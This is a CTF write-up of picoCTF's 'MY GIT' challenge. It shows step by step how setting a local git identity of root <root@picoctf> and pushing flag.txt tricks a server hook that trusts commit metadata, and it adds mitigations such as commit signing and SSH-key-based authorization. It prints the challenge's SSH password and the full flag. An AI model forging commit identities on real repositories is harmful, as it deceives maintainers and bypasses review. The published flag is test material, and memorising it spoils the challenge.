# CTF Lab Writeup: MY GIT
### Platform: PicoCTF | Difficulty: Beginner-Intermediate | Category: Web/Git Exploitation

---

## 1. Executive Summary

**Challenge Name:** MY GIT
**Platform:** PicoCTF
**Category:** Git Security / Identity Forgery
**Difficulty:** Beginner-Intermediate
**Flag:** `picoCTF{1mp3rs0n4t4_g17_345y_e522152d}`

This challenge teaches one of the most misunderstood security concepts in Git-based workflows: **Git commit metadata is not authenticated**. The challenge presents a custom Git server with a server-side "rule" that grants access to the flag only when a commit is pushed by a specific user identity (`root` with email `root@picoctf`). Since Git freely allows users to configure any identity locally, we simply forged this identity and triggered the server-side hook, which revealed the flag in the push response.

**Primary Vulnerability Exploited:** Git Identity Impersonation via unsigned, unverified commit metadata.

**Key Skills Demonstrated:**
- Git repository analysis
- Local Git identity configuration
- Understanding of server-side Git hooks
- Exploiting trust in commit metadata

---

## 2. Reconnaissance & Enumeration

### 2.1 Understanding the Attack Surface

Before touching any tools, let us understand what we are given:

```
git clone ssh://git@foggy-cliff.picoctf.net:65359/git/challenge.git
Password: d9df7038
```

Breaking this down:
- **`ssh://`** — The transport protocol is SSH. This means authentication is happening over an encrypted channel, but our *Git identity* (author/committer fields) is separate from our SSH authentication.
- **`git@`** — The SSH user is `git`, a common convention for shared Git hosting (used by GitHub, GitLab, etc.). Everyone authenticates as the same `git` OS user; the hosting software differentiates users by their SSH keys or passwords.
- **`foggy-cliff.picoctf.net:65359`** — A non-standard port (`65359` instead of the default `22`). This is common in CTF environments to avoid conflicts.
- **`/git/challenge.git`** — The repository path on the server.

> 💡 **Beginner Tip:** Notice the distinction here. The **SSH password** (`d9df7038`) authenticates *who can connect to the server*. The **Git identity** (username/email in git config) is metadata *embedded in your commits*. These are two completely separate concepts — and this distinction is the heart of this challenge.

### 2.2 Cloning the Repository

**Command Used:**
```bash
git clone ssh://git@foggy-cliff.picoctf.net:65359/git/challenge.git
```

**Why this command?**
- `git clone` retrieves the entire repository history, not just the latest files. This is crucial because flags are often hidden in **old commits**, **branches**, or **stashed changes** — not just the current working directory.
- We always clone first before exploring, so we have a local copy to analyze freely without triggering server-side rate limits or alarms.

**What we got:**
```
total 16
drwxrwxr-x 3 ved ved 4096 May 17 15:47 .
drwxrwxr-x 3 ved ved 4096 May 17 15:47 ..
drwxrwxr-x 8 ved ved 4096 May 17 15:47 .git
-rw-rw-r-- 1 ved ved  155 May 17 15:47 README.md
```

**Analysis of the output:**
- **`README.md`** — Directly referenced in the challenge description ("Check the README to get your flag!"). First target.
- **`.git/`** — The hidden Git metadata directory. This contains the full repository history, configuration, hooks, and object store. In many CTF challenges, secrets are buried here. We noted it for potential future exploration.

### 2.3 Reading the README

**Command Used:**
```bash
cat challenge/README.md
```

**Why `cat`?**
- Simple, fast, and shows the raw file content with no formatting. For a small file like a README, there is no need for a pager like `less` or an editor.

**Output:**
```
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by `root:root@picoctf` will be updated with the flag.

GOOD LUCK!
```

**Critical Analysis — This is the key discovery:**

The README tells us everything we need:
1. The action required is a **push** (not just a read).
2. The file must be named **`flag.txt`**.
3. The identity must be **`root`** (username) with email **`root@picoctf`**.

The format `root:root@picoctf` maps directly to:
- `user.name = root`
- `user.email = root@picoctf`

These are exactly the two fields controlled by `git config` — which is precisely what the challenge hint was pointing to: *"How do you specify your Git username and email?"*

---

## 3. Initial Foothold (Exploitation)

### 3.1 The Core Concept: Why Git Identity Can Be Forged

Before diving into commands, let us understand **why this works at a conceptual level**.

When you make a Git commit, Git embeds the following metadata into the commit object:
```
Author: root <root@picoctf>
Date:   Sat May 17 15:47:00 2025 +0000
```

This information comes **exclusively from your local Git configuration**:
```bash
git config user.name "anything you want"
git config user.email "anything@you.want"
```

Git does **not** cryptographically verify or sign this information by default. There is no mechanism preventing you from setting your name to `Linus Torvalds` or your email to `president@whitehouse.gov`. Git simply trusts whatever you put there.

This is analogous to writing a letter and signing it with anyone's name — the envelope (SSH authentication) proves *you sent it*, but the *signature inside the letter* is whatever you wrote.

> ⚠️ **Security Insight:** This is why GPG commit signing exists (`git commit -S`). When commits are GPG-signed, a third party can cryptographically verify that the commit truly came from a specific person with a specific private key. Without GPG signing, commit authorship is purely cosmetic and entirely forgeable.

The custom Git server in this challenge made the critical mistake of **trusting the commit author metadata** as a form of authorization.

### 3.2 Configuring the Forged Identity

**Why local config instead of global?**

There are two scopes of Git configuration:
- `--global` → Applies to all repositories on your system (`~/.gitconfig`)
- *(default/local)* → Applies only to the current repository (`.git/config`)

We deliberately used the **local** (repository-level) configuration to avoid polluting our system-wide Git identity. This is best practice in CTF environments.

**Step 1 — Set the username:**
```bash
git -C challenge config user.name "root"
```

Breaking down the flags:
- `git -C challenge` — The `-C` flag tells Git to change into the `challenge` directory before running the command. This avoids having to `cd` into the directory manually. Equivalent to `cd challenge && git config ...`
- `config` — The Git subcommand for reading/writing configuration values.
- `user.name "root"` — Sets the author name that will be embedded in all future commits in this repository.

**Step 2 — Set the email:**
```bash
git -C challenge config user.email "root@picoctf"
```

Same structure as above, but sets the `user.email` field to match the server's required identity exactly.

**Verification (optional but good practice):**
```bash
git -C challenge config --list | grep user
```
This would confirm:
```
user.name=root
user.email=root@picoctf
```

### 3.3 Creating and Pushing the Trigger File

**Step 3 — Create `flag.txt`:**
```bash
echo "requesting flag" > challenge/flag.txt
```

- `echo "requesting flag"` — Outputs a placeholder string. The *content* of `flag.txt` does not matter here; the server's hook logic checks for the *existence* of the file and the *author identity* of the commit, not the file's content.
- `>` — Redirects the output into a new file named `flag.txt`.

**Step 4 — Stage the file:**
```bash
git -C challenge add flag.txt
```

- `git add` — Moves the file from the **working directory** into the **staging area** (also called the index). Only staged changes are included in the next commit.
- This is a necessary precursor to committing. Git will not commit files it does not know about.

**Step 5 — Commit with our forged identity:**
```bash
git -C challenge commit -m "Add flag.txt"
```

- `commit` — Creates a new commit object in the repository.
- `-m "Add flag.txt"` — Provides the commit message inline. The message content is irrelevant to the server's validation logic.

At this point, the commit object stored in `.git/objects/` contains:
```
Author: root <root@picoctf>
```
Our forged identity is now permanently baked into the commit.

**Step 6 — Push to the server:**
```bash
git -C challenge push origin master
```

- `push` — Transmits local commits to the remote repository.
- `origin` — The default name Git assigns to the remote server you cloned from. Defined automatically in `.git/config`.
- `master` — The branch name we are pushing.

**Server Response (the moment of truth):**
```
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
```

The `remote:` prefix indicates these lines are being sent back from the server's **post-receive hook** — a script that runs on the server after a push is accepted.

---

### 3.4 The Road Not Taken — Common Rabbit Holes

Here are approaches a beginner might try that would **not** work or would be unnecessary:

| ❌ Approach | Why it Fails / Why We Avoided It |
|---|---|
| **Brute-forcing the SSH password** | We were given the password. Even if we weren't, brute-forcing over SSH is slow, noisy, and against CTF ethics. |
| **Digging through `.git/` history for the flag** | `git log`, `git stash list`, and `git reflog` showed no hidden commits containing a flag. The flag did not exist yet — it had to be *generated* by the server hook. |
| **Modifying the `README.md`** | The server only cared about `flag.txt`. Pushing other files would not trigger the hook. |
| **Trying different email formats** | `root@picoctf` is explicitly stated. Variations like `root@picoctf.com` would not match the server's condition. |
| **Setting global Git config** | Would work technically, but pollutes your system-wide identity. Poor practice. Always prefer local config in CTFs. |
| **GPG signing the commit** | Unnecessary here. The server does not verify GPG signatures — it only checks plain author metadata. |

---

## 4. Privilege Escalation

> **Note:** This challenge is not a traditional machine-based CTF, so there is no privilege escalation phase involving a local shell. However, the *conceptual equivalent* of privilege escalation here was **identity escalation** — elevating our effective permissions from an anonymous user to the trusted `root` user from the server's perspective — achieved entirely through metadata forgery.

---

## 5. Lessons Learned & Mitigation

### 5.1 For the Attacker (Blue Team Awareness)

The full attack path was remarkably simple:
1. Read the policy document (`README.md`)
2. Forge the identity described in the policy (`git config`)
3. Push the required artifact (`flag.txt`)
4. Receive the privileged response

This mirrors real-world scenarios where **access control is implemented at the application layer using unverifiable metadata** instead of cryptographically sound mechanisms.

### 5.2 Mitigation Strategies (Blue Team)

**🔵 Mitigation 1: Enforce GPG Commit Signing**

The definitive fix is to require all commits to be signed with a verified GPG key:

```bash
# On the server-side hook, verify the commit signature:
git verify-commit <commit-hash>
```

Configure the server to only accept pushes where the commit is GPG-signed by a key in a trusted keyring. This way, even if an attacker sets `user.name = root`, they cannot forge the cryptographic signature without the private key.

**🔵 Mitigation 2: Map Permissions to SSH Keys, Not Git Identity**

Instead of trusting commit metadata, use the **SSH key** used to authenticate the push as the source of identity truth. Tools like:
- **Gitolite** — Maps SSH public keys to specific repository permissions.
- **Gitea / GitLab** — Associate SSH keys with user accounts at the platform level.

In these systems, the question "who pushed this?" is answered by *which SSH key was used*, not *what name they put in their commit*. This is the approach used by all major Git hosting platforms.

**🔵 Detection (for Blue Teams):**

If you cannot immediately enforce GPG signing, set up alerting for commits where:
- The author name/email does not match the authenticated SSH user's registered profile
- A privileged identity (like `root`) appears in commit metadata from an unexpected key

```bash
# Example pre-receive hook to detect mismatches:
while read oldrev newrev refname; do
  author=$(git log --format="%ae" $oldrev..$newrev)
  ssh_user=$GL_USER  # Gitolite variable for authenticated user
  if [ "$author" != "$ssh_user@yourdomain.com" ]; then
    echo "Identity mismatch detected!"
    exit 1
  fi
done
```

### 5.3 Key Takeaways for CTF Players

| Concept | Takeaway |
|---|---|
| **Git identity ≠ Git authentication** | SSH keys prove who connected. Commit metadata proves nothing. |
| **Always read policy documents** | The `README.md` was the entire exploit roadmap. Never skip documentation. |
| **`remote:` output is gold** | Server hooks communicate through this channel. Always read push responses carefully. |
| **Local vs. global config** | Use `--local` (or no flag, which defaults to local) in CTFs to avoid contaminating your environment. |
| **Server-side hooks are powerful** | `pre-receive`, `update`, and `post-receive` hooks are where custom Git server logic lives. Understanding them is essential for Git security research. |

---

> ✅ **Flag Confirmed:** `picoCTF{1mp3rs0n4t4_g17_345y_e522152d}`
> 
> The flag name itself is a hint decoded: `1mp3rs0n4t4_g17` = **Impersonate Git** — a perfect description of the vulnerability exploited.
